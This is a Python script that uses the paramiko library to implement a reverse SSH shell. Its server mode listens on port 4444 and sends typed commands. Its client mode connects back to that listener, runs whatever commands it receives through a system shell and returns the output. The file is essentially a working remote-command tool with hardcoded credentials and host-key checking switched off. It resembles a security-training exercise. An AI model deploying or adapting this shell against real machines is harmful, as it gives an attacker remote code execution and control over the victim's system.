#!/bin/env python3

# Server
import sys
import socket
import threading

# Client
import subprocess

# Common for server and clinet
import paramiko

USERNAME = "admin"
PASSWORD = "verySecure"


def ssh_command(ip, user, passwd, command):
    '''
    ssh_command(ip, user, passwd, command): Connects to a remote host and executes a command
        ip: IP address of the remote host
        user: Username to use for authentication
        passwd: Password to use for authentication
        command: Command to execute on the remote host

    This function can also be used to connect to regular SSH servers.
    '''
    client = paramiko.SSHClient()
    # client.load_host_keys('~/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        result = ssh_session.recv(1024)

        try:
            print(result.decode('utf-8'))
        except UnicodeDecodeError:
            print(result)
    return


def server(server, port):
    '''
    server(server, port): Creates a SSH server
        server: IP address of the server
        port: Port to listen on

    This function can be used to create a SSH server that can be connected to using the client function.
    '''
    host_key = paramiko.RSAKey(filename="test_rsa.key")

    class Server (paramiko.ServerInterface):
        def __init__(self):
            self.event = threading.Event()

        def check_channel_request(self, kind: str, chanid: int):
            if (kind == "session"):
                return paramiko.OPEN_SUCCEEDED
            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
        # return super().check_channel_request(kind, chanid)

        def check_auth_password(self, username, password):
            print("[+] Checking authentication...")
            if (username == USERNAME and password == PASSWORD):
                return paramiko.AUTH_SUCCESSFUL
            return paramiko.AUTH_FAILED

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen(100)
        print("[+] Listening for connection...")
        client, addr = sock.accept()
    except Exception as e:
        print("[-] Listen failed:", str(e))
        sys.exit(1)
    print("[+] Got connection...")

    try:
        session = paramiko.Transport(client)
        session.add_server_key(host_key)
        server = Server()
        try:
            session.start_server(server=server)
        except paramiko.SSHException as x:
            print("[-] SSH negotiation failed...")
        channel = session.accept(20)
        print("[+] Authenticated...")
        print(channel.recv(1024))
        channel.send("Welcome to SSH")

        while True:
            try:
                command = input("Enter command: ").strip("\n")

                channel.send(command)

                if (command == "exit"):
                    print("Exiting...")
                    sys.exit(0)

                result = channel.recv(1024)
                try:
                    print(result.decode('utf-8'))
                except UnicodeDecodeError:
                    print(result)
            except KeyboardInterrupt:
                session.close()
    except Exception as e:
        print("[-] Error:", str(e))

        try:
            session.close()
        except:
            pass
        sys.exit(1)


def client(ip, port, user, passwd, command):
    '''
    client(ip, port, user, passwd, command): Connects to a SSH server and executes a command
        ip: IP address of the SSH server
        port: Port to connect to
        user: Username to use for authentication
        passwd: Password to use for authentication
        command: Command to execute on the SSH server (for first time while connecting)

    This function can be used to connect to the SSH server created by the server function.
    '''
    print(f"[+] Connecting to {ip}:{port}...")
    client = paramiko.SSHClient()
    # client.load_host_keys('/home/justin/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd, port=port)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)

        # Read banner
        print(ssh_session.recv(1024).decode('utf-8'))

        try:
            while True:
                # Get command from SSH server
                command = ssh_session.recv(1024)
                if (command == "exit"):
                    break

                try:
                    cmd_output = subprocess.check_output(
                        command.decode('utf-8'), shell=True)
                    ssh_session.send(cmd_output)
                except Exception as e:
                    ssh_session.send(str(e))
            client.close()
        except OSError:
            print("[+] Connection closed...")
    return


if __name__ == '__main__':
    # import getpass
    # ssh_command("192.168.0.3", input("Enter username: "), getpass.getpass(
    # "Enter password: "), input("Enter command: "))

    run_as = input("Run as ((s)erver / (c)lient): ").lower()

    SERVER_IP = "192.168.0.3"
    PORT = 4444
    if (run_as == 's'):
        server(SERVER_IP, PORT)
    else:
        client(SERVER_IP, PORT, USERNAME, PASSWORD, "ClientConnected")
